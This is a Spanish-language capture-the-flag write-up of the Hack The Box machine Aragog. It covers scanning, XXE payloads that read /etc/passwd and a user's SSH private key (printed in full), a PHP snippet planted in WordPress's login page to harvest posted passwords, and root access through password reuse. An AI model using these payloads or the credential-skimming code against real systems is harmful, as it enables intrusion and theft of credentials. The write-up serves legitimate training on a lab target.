---
title: Hack The Box Aragog
author: k4miyo
date: 2021-09-20
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Medium, Linux]
tags: [PHP, XXE, File Misconfiguration]
ping: true
---

## Aragog
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.78.

```bash
❯ ping -c 1 10.10.10.78
PING 10.10.10.78 (10.10.10.78) 56(84) bytes of data.
64 bytes from 10.10.10.78: icmp_seq=1 ttl=63 time=143 ms

--- 10.10.10.78 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 143.053/143.053/143.053/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.78 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 00:43 CDT
Initiating SYN Stealth Scan at 00:43
Scanning 10.10.10.78 [65535 ports]
Discovered open port 22/tcp on 10.10.10.78
Discovered open port 21/tcp on 10.10.10.78
Discovered open port 80/tcp on 10.10.10.78
Completed SYN Stealth Scan at 00:44, 22.05s elapsed (65535 total ports)
Nmap scan report for 10.10.10.78
Host is up, received user-set (0.19s latency).
Scanned at 2021-09-20 00:43:45 CDT for 22s
Not shown: 51923 closed tcp ports (reset), 13609 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 22.36 seconds
           Raw packets sent: 108742 (4.785MB) | Rcvd: 57740 (2.310MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.78
   5   │     [*] Open ports: 21,22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p21,22,80 10.10.10.78 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 00:45 CDT
Nmap scan report for 10.10.10.78
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.16
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:21:fb:50:16:d4:93:dc:b7:29:1f:4c:c2:61:16:48 (RSA)
|   256 2c:94:00:3c:57:2f:c2:49:77:24:aa:22:6a:43:7d:b1 (ECDSA)
|_  256 9a:ff:8b:e4:0e:98:70:52:29:68:0e:cc:a0:7d:5c:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.38 seconds
```

Analizando los resultados obtenidos de `nmap`, vemos que podemos acceder al servicio FTP como el usuario *anonymous*:

```bash
❯ ftp 10.10.10.78
Connected to 10.10.10.78.
220 (vsFTPd 3.0.3)
Name (10.10.10.78:k4miyo): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
226 Directory send OK.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Dec 21  2017 .
drwxr-xr-x    2 ftp      ftp          4096 Dec 21  2017 ..
-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
226 Directory send OK.
ftp>
```

Aquí vemos sólo el archivo `test.txt`, por lo que procedemos a descargarlo a nuestra máquina para ver su contenido:

```bash
ftp> binary
200 Switching to Binary mode.
ftp> get test.txt
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for test.txt (86 bytes).
226 Transfer complete.
86 bytes received in 0.00 secs (1.2061 MB/s)
ftp>
```

Abrimos el archivo y vemos que no presente contenido interesando; sin embargo, tiene un formato de `xml`.

```bash
❯ cat test.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: test.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <details>
   2   │     <subnet_mask>255.255.255.192</subnet_mask>
   3   │     <test></test>
   4   │ </details>
```

Tambíen vemos que se encuentra abierto el puerto 80, por lo que ya sabemos que debemos ver las tecnologías que usa:

```bash
❯ whatweb http://10.10.10.78/
http://10.10.10.78/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.78], Title[Apache2 Ubuntu Default Page: It works]
```

De acuerdo con el título de la página, vemos que se trata de la web default de Apache. También lo podemos corroborar accediendo vía web.

![](/assets/images/htb-aragog/aragog_web.png)

A este punto, vamos a tratar de descubrir posibles recursos que se encuentre dentro del sitio web. Para este caso vamos a usar `nmap` para enumrar:

```bash
❯ nmap --script http-enum -p80 10.10.10.78
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 00:55 CDT
Nmap scan report for 10.10.10.78
Host is up (0.14s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.84 seconds
```

En este caso no nos trajo información, por lo que vamos con un diccionario más grandes y tirando de la herramienta `wfuzz`:

```bash
❯ wfuzz -c --hc=404 --hw=968 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.78/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.78/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

```

Despúes de un buen rato, no encontramos ningún directorio en el servidor. Así que ahora vamos a buscar que recursos, primeramente creandonos un archivo donde pongamos algunas extensiones de archivos:

```bash
❯ cat extensiones.txt
───────┬───────────────────────────────────────────────────────────────────────
       │ File: extensiones.txt
───────┼───────────────────────────────────────────────────────────────────────
   1   │ txt
   2   │ php
   3   │ php3
   4   │ php4
   5   │ php5
   6   │ xml
   7   │ html
```

Y volvemos a utilizar `wfuzz` agregando nuestro nuevo archivo de extensiones:

```bash
❯ wfuzz -c --hc=404 --hw=968 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extensiones.txt http://10.10.10.78/FUZZ.FUZ2Z
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.78/FUZZ.FUZ2Z
Total requests: 882240

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000054:   403        11 L     32 W       290 Ch      "php"                                                           
000000056:   403        11 L     32 W       291 Ch      "html"                                                          
000024082:   200        3 L      6 W        46 Ch       "hosts - php"                                                   
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 26495
Filtered Requests: 26492
Requests/sec.: 0
```

Vemos que existe un recurso denomiando **hosts.php**, por lo que accedemos  y vemos lo siguiente:

![](/assets/images/htb-aragog/aragog_hosts.png)

"*There are 4294967294 possible hosts for*", dicha frase hace referencia a los hosts que se encuentran en una red con determinada máscara; por lo tanto encontramos relación con el archivo **test.txt** que encontramos por FTP.

Ahora, analizando un poco, vemos que el archivo **test.txt** tiene un formato en XML; buscando un poco, vemos que existe una vulnerabilidad relacionada a XML denominada XXE (XML External Entity) que podríamos probar. Para hacerlo, vamos a hacer uso de la herramienta `curl` en conjunto con el parámetro `-d` para que el sitio nos pueda leer un archivo, para este caso el **test.txt** y ver que nos arroja:

```bash
❯ curl -d @test.txt http://10.10.10.78/hosts.php

There are 62 possible hosts for 255.255.255.192
```

Podemos corroborar que el sitio es vulnerable a ataques de tipo XXE; por lo tanto en vez de que el sitio nos lea el archivo **test.txt**, vamos a buscar una forma de poder ingresar a la máquina víctima. Si quieremos saber un poco más al respecto, podemos consultar la siguiente liga:

[XML External Entity (XXE) Processing)](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)

Haciendo una pruebas, vemos que se crea una entidad llamada `xxe`, el cual lo sustituimos en el campo que es leido por el servidor, para este caso el campo `subnet_mask`.

```bash
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo
  [<!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "expect://id" >]>
<details>
    <subnet_mask>&xxe;</subnet_mask>
    <test></test>
</details>
```

Lo ejecutamos y vemos que no obtenemos algún resultado. Esto puede ser porque al servidor no le gusta el wrapper `expect`, así que vamos a utilizar otro, como por ejemplo `file`:

```bash
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo
  [<!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<details>
    <subnet_mask>&xxe;</subnet_mask>
    <test></test>
</details>
```

Lo ejecutamos y podemos ser el archivo `/etc/passwd` de la máquina víctima; por lo que podemos visualizar contenido del sistema.

```bash
❯ curl -d @test.txt http://10.10.10.78/hosts.php
                                                                
There are 4294967294 possible hosts for root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin       
sys:x:3:3:sys:/dev:/usr/sbin/nologin             
sync:x:4:65534:sync:/bin:/bin/sync                 
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin     
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin        
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                                                              
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                                                             
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                                                             
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin                                                                    
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                                                                 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false                                                                                        
_apt:x:105:65534::/nonexistent:/bin/false                                                                                        
messagebus:x:106:110::/var/run/dbus:/bin/false         
uuidd:x:107:111::/run/uuidd:/bin/false                                                                                           
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false                  
whoopsie:x:109:117::/nonexistent:/bin/false                 
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false 
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false  
saned:x:119:127::/var/lib/saned:/bin/false     
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
florian:x:1000:1000:florian,,,:/home/florian:/bin/bash
cliff:x:1001:1001::/home/cliff:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:123:130:ftp daemon,,,:/srv/ftp:/bin/false
```

Aquí podemos ver los usuarios del sistema *florian* y *cliff*. Pensando un poco, tenemos usuarios del sistema, el puerto 22 abierto y podemos ver archivos de sistema; con eso vamos a tratar de obtener el archivo `id_rsa` de los usuarios para tratar de conectarnos a la máquina víctima por SSH sin proporcionar contraseña.

#### test.txt
```bash
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo
    [<!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///home/florian/.ssh/id_rsa" >]>
  <details>
      <subnet_mask>&xxe;</subnet_mask>
      <test></test>
  </details>
```

#### Ejecución
```bash
❯ curl -d @test.txt http://10.10.10.78/hosts.php

There are 4294967294 possible hosts for -----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d
+YQEMbEg+yjj6/ybxJAsF8l2kUhfk56LdpmC3mf/sO4romp9ONkl9R4cu5OB5ef8
lAjOg67dxWIo77STqYZrWUVnQ4n8dKG4Tb/z67+gT0R9lD9c0PhZwRsFQj8aKFFn
1R1B8n9/e1PB0AJ81PPxCc3RpVJdwbq8BLZrVXKNsg+SBUdbBZc3rBC81Kle2CB+
Ix89HQ3deBCL3EpRXoYVQZ4EuCsDo7UlC8YSoEBgVx4IgQCWx34tXCme5cJa/UJd
d4Lkst4w4sptYMHzzshmUDrkrDJDq6olL4FyKwIDAQABAoIBAAxwMwmsX0CRbPOK
AQtUANlqzKHwbVpZa8W2UE74poc5tQ12b9xM2oDluxVnRKMbyjEPZB+/aU41K1bg
TzYI2b4mr90PYm9w9N1K6Ly/auI38+Ouz6oSszDoBeuo9PS3rL2QilOZ5Qz/7gFD
9YrRCUij3PaGg46mvdJLmWBGmMjQS+ZJ7w1ouqsIANypMay2t45v2Ak+SDhl/SDb
/oBJFfnOpXNtQfJZZknOGY3SlCWHTgMCyYJtjMCW2Sh2wxiQSBC8C3p1iKWgyaSV
0qH/3gt7RXd1F3vdvACeuMmjjjARd+LNfsaiu714meDiwif27Knqun4NQ+2x8JA1
sWmBdcECgYEA836Z4ocK0GM7akW09wC7PkvjAweILyq4izvYZg+88Rei0k411lTV
Uahyd7ojN6McSd6foNeRjmqckrKOmCq2hVOXYIWCGxRIIj5WflyynPGhDdMCQtIH
zCr9VrMFc7WCCD+C7nw2YzTrvYByns/Cv+uHRBLe3S4k0KNiUCWmuYsCgYEA8yFE
rV5bD+XI/iOtlUrbKPRyuFVUtPLZ6UPuunLKG4wgsGsiVITYiRhEiHdBjHK8GmYE
tkfFzslrt+cjbWNVcJuXeA6b8Pala7fDp8lBymi8KGnsWlkdQh/5Ew7KRcvWS5q3
HML6ac06Ur2V0ylt1hGh/A4r4YNKgejQ1CcO/eECgYEAk02wjKEDgsO1avoWmyL/
I5XHFMsWsOoYUGr44+17cSLKZo3X9fzGPCs6bIHX0k3DzFB4o1YmAVEvvXN13kpg
ttG2DzdVWUpwxP6PVsx/ZYCr3PAdOw1SmEodjriogLJ6osDBVcMhJ+0Y/EBblwW7
HF3BLAZ6erXyoaFl1XShozcCgYBuS+JfEBYZkTHscP0XZD0mSDce/r8N07odw46y
kM61To2p2wBY/WdKUnMMwaU/9PD2vN9YXhkTpXazmC0PO+gPzNYbRe1ilFIZGuWs
4XVyQK9TWjI6DoFidSTGi4ghv8Y4yDhX2PBHPS4/SPiGMh485gTpVvh7Ntd/NcI+
7HU1oQKBgQCzVl/pMQDI2pKVBlM6egi70ab6+Bsg2U20fcgzc2Mfsl0Ib5T7PzQ3
daPxRgjh3CttZYdyuTK3wxv1n5FauSngLljrKYXb7xQfzMyO0C7bE5Rj8SBaXoqv
uMQ76WKnl3DkzGREM4fUgoFnGp8fNEZl5ioXfxPiH/Xl5nStkQ0rTA==
-----END RSA PRIVATE KEY-----
```

Nos copiamos la `id_rsa` a un archivo con mismo nombre y le damos permisos 600:

```bash
❯ vi id_rsa
❯ cat id_rsa
───────┬──────────────────────────────────────────────────────────────
       │ File: id_rsa
───────┼──────────────────────────────────────────────────────────────
   1   │ -----BEGIN RSA PRIVATE KEY-----
   2   │ MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d
   3   │ +YQEMbEg+yjj6/ybxJAsF8l2kUhfk56LdpmC3mf/sO4romp9ONkl9R4cu5OB5ef8
   4   │ lAjOg67dxWIo77STqYZrWUVnQ4n8dKG4Tb/z67+gT0R9lD9c0PhZwRsFQj8aKFFn
   5   │ 1R1B8n9/e1PB0AJ81PPxCc3RpVJdwbq8BLZrVXKNsg+SBUdbBZc3rBC81Kle2CB+
   6   │ Ix89HQ3deBCL3EpRXoYVQZ4EuCsDo7UlC8YSoEBgVx4IgQCWx34tXCme5cJa/UJd
   7   │ d4Lkst4w4sptYMHzzshmUDrkrDJDq6olL4FyKwIDAQABAoIBAAxwMwmsX0CRbPOK
   8   │ AQtUANlqzKHwbVpZa8W2UE74poc5tQ12b9xM2oDluxVnRKMbyjEPZB+/aU41K1bg
   9   │ TzYI2b4mr90PYm9w9N1K6Ly/auI38+Ouz6oSszDoBeuo9PS3rL2QilOZ5Qz/7gFD
  10   │ 9YrRCUij3PaGg46mvdJLmWBGmMjQS+ZJ7w1ouqsIANypMay2t45v2Ak+SDhl/SDb
  11   │ /oBJFfnOpXNtQfJZZknOGY3SlCWHTgMCyYJtjMCW2Sh2wxiQSBC8C3p1iKWgyaSV
  12   │ 0qH/3gt7RXd1F3vdvACeuMmjjjARd+LNfsaiu714meDiwif27Knqun4NQ+2x8JA1
  13   │ sWmBdcECgYEA836Z4ocK0GM7akW09wC7PkvjAweILyq4izvYZg+88Rei0k411lTV
  14   │ Uahyd7ojN6McSd6foNeRjmqckrKOmCq2hVOXYIWCGxRIIj5WflyynPGhDdMCQtIH
  15   │ zCr9VrMFc7WCCD+C7nw2YzTrvYByns/Cv+uHRBLe3S4k0KNiUCWmuYsCgYEA8yFE
  16   │ rV5bD+XI/iOtlUrbKPRyuFVUtPLZ6UPuunLKG4wgsGsiVITYiRhEiHdBjHK8GmYE
  17   │ tkfFzslrt+cjbWNVcJuXeA6b8Pala7fDp8lBymi8KGnsWlkdQh/5Ew7KRcvWS5q3
  18   │ HML6ac06Ur2V0ylt1hGh/A4r4YNKgejQ1CcO/eECgYEAk02wjKEDgsO1avoWmyL/
  19   │ I5XHFMsWsOoYUGr44+17cSLKZo3X9fzGPCs6bIHX0k3DzFB4o1YmAVEvvXN13kpg
  20   │ ttG2DzdVWUpwxP6PVsx/ZYCr3PAdOw1SmEodjriogLJ6osDBVcMhJ+0Y/EBblwW7
  21   │ HF3BLAZ6erXyoaFl1XShozcCgYBuS+JfEBYZkTHscP0XZD0mSDce/r8N07odw46y
  22   │ kM61To2p2wBY/WdKUnMMwaU/9PD2vN9YXhkTpXazmC0PO+gPzNYbRe1ilFIZGuWs
  23   │ 4XVyQK9TWjI6DoFidSTGi4ghv8Y4yDhX2PBHPS4/SPiGMh485gTpVvh7Ntd/NcI+
  24   │ 7HU1oQKBgQCzVl/pMQDI2pKVBlM6egi70ab6+Bsg2U20fcgzc2Mfsl0Ib5T7PzQ3
  25   │ daPxRgjh3CttZYdyuTK3wxv1n5FauSngLljrKYXb7xQfzMyO0C7bE5Rj8SBaXoqv
  26   │ uMQ76WKnl3DkzGREM4fUgoFnGp8fNEZl5ioXfxPiH/Xl5nStkQ0rTA==
  27   │ -----END RSA PRIVATE KEY-----
❯ chmod 600 id_rsa
```

Ahora vamos a conectarnos a la máquina:

```bash
❯ ssh -i id_rsa florian@10.10.10.78
The authenticity of host '10.10.10.78 (10.10.10.78)' can't be established.
ECDSA key fingerprint is SHA256:phu0FjQg/9nCmL2014AJ9yH4akvraA7Ea5QtE59wqD4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.78' (ECDSA) to the list of known hosts.
Last login: Fri Jan 12 13:56:45 2018 from 10.10.14.3
florian@aragog:~$ whoami
florian
florian@aragog:~$
```

Ya estamos dentro de la máquina como el usuario *florian* y a partir de aquí podemos visualizar la flag (user.txt).  Nos queda escalar privilegios, así que vamos a enumerar un poco el sistema:

```bash
florian@aragog:/var/www/html$ ll
total 32
drwxrwxrwx 4 www-data www-data  4096 Sep 20 12:35 ./
drwxr-xr-x 3 root     root      4096 Dec 18  2017 ../
drwxrwxrwx 5 cliff    cliff     4096 Sep 20 12:35 dev_wiki/
-rw-r--r-- 1 www-data www-data   689 Dec 21  2017 hosts.php
-rw-r--r-- 1 www-data www-data 11321 Dec 18  2017 index.html
drw-r--r-- 5 cliff    cliff     4096 Dec 20  2017 zz_backup/
florian@aragog:/var/www/html$
```

Vemos que dentro de `var/www/html` se tienen varios recursos asociados al sitio web. Algo raro que notamos es que el recurso `dev_wiki/` está asignado al grupo y al usuario *cliff*; pero nosotros como el usuario *florian* tenemos permisos `rwx`. Podemos pensar en ver los archivos dentro de dicho directorio, pero antes de eso, vamos a listar los procesos que se estan ejecutando en el sistema a intervalos regulares con la creación del archivo `procmon.sh`:

```bash
florian@aragog:/var/www/html$ cd /dev/shm/
florian@aragog:/dev/shm$ touch procmon.sh
florian@aragog:/dev/shm$ chmod +x procmon.sh
florian@aragog:/dev/shm$ nano procmon.sh
florian@aragog:/dev/shm$ cat procmon.sh 
#!/bin/bash

old_process=$(ps -eo command)

while true; do
        new_process=$(ps -eo command)
        diff <(echo "$old_process") <(echo "$new_process") | grep "[\<\>]" | grep -v -E "command|procmon"
        old_process=$new_process
done

florian@aragog:/dev/shm$
```

Ejecutamos nuestro script:

```bash
florian@aragog:/dev/shm$ ./procmon.sh 
> /usr/sbin/CRON -f
> /bin/sh -c /usr/bin/python /home/cliff/wp-login.py
> /usr/bin/python /home/cliff/wp-login.py
< /usr/sbin/CRON -f
< /bin/sh -c /usr/bin/python /home/cliff/wp-login.py
< /usr/bin/python /home/cliff/wp-login.py
> /usr/sbin/CRON -f
> /usr/sbin/CRON -f
> /bin/sh -c /bin/bash /root/restore.sh
> /bin/sh -c /usr/bin/python /home/cliff/wp-login.py
> /bin/bash /root/restore.sh
> rm -rf /var/www/html/dev_wiki/
> /usr/bin/python /home/cliff/wp-login.py
< /usr/sbin/CRON -f
< /bin/sh -c /usr/bin/python /home/cliff/wp-login.py
< rm -rf /var/www/html/dev_wiki/
< /usr/bin/python /home/cliff/wp-login.py
> chmod -R 777 /var/www/html/dev_wiki/
< /usr/sbin/CRON -f
< /bin/sh -c /bin/bash /root/restore.sh
< /bin/bash /root/restore.sh
< chmod -R 777 /var/www/html/dev_wiki/
^C
```

Del resultado, vemos que se está ejecutando el recurso `/home/cliff/wp-login.py`, un archivo en python relacionado a un posible WordPress (por el `wp-login`), tal vez una posible autenticación. Además, vemos que se ejecuta `/root/restore.sh` que restablece los archivo en la ruta `/var/www/html/dev_wiki/`. Si ingresamos a la página `http://10.10.10.78/dev_wiki` , nos redirecciona a `http://aragog/dev_wiki/`, así que agremos **aragog** a nuestro archivo `/etc/hosts` y así podemos ver el recurso.

![](/assets/images/htb-aragog/aragog_wiki.png)

Vemos que el sitio hace uso de WordPress, por lo que debe de existir su panel de administración en [wp-admin](http://aragog/dev_wiki/wp-login.php):

![](/assets/images/htb-aragog/aragog_wordpress.png)

Con lo que tenemos, podemos pensar que el programa `/home/cliff/wp-login.py` se está autenticando el el portal de login de wordPress y como tenemos permisos para modificar los archivos encontrado en `dev_wiki`, podemos obtener las crenciales de login agregando las siguientes líneas en el archivo `wp-login.php` (Nota: Hay que hacerlo rápido porque tenemos que recordar que se restablecen los archivos de dicho directorio debido al script `restore.sh` ejecutado por el usuario **root**).

```bash
require( dirname(__FILE__) . '/wp-load.php' );

$file='datos_login.txt';
file_put_contents($file, print_r($_POST, true), FILE_APPEND);
```

Con lo anterior, se crea un archivo de nombre `datos_login.txt` cuando se intenta autenticar en el panel de login de WordPress. Para ver cuando el archivo se haya creado, monitoreamos el contenido de la carpeta con:

```bash
florian@aragog:/var/www/html/dev_wiki$ watch -n 1 ls -l
```

Vemos rápidamente el contenido del archivo `datos_login.txt`:

```bash
florian@aragog:/var/www/html/dev_wiki$ cat datos_login.txt
Array
(
    [pwd] => !KRgYs(JFO!&MTr)lf
    [wp-submit] => Log In
    [testcookie] => 1
    [log] => Administrator
    [redirect_to] => http://127.0.0.1/dev_wiki/wp-admin/
)
florian@aragog:/var/www/html/dev_wiki$
```

Y tenemos la contraseña del usuario **Administrator** del portal de WordPress. Podíamos pensar que se está utilizando reutilización de contraseñas y podemos probar para el usuario **root** de la máquina.

```bash
florian@aragog:/var/www/html/dev_wiki$ su root
Password: 
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
sh: 0: getcwd() failed: No such file or directory
root@aragog:/var/www/html/dev_wiki# cd ..
chdir: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
root@aragog:..# whoami
root
root@aragog:..#
```

A partir de aquí ya podemos visualizar la flag (root.txt).
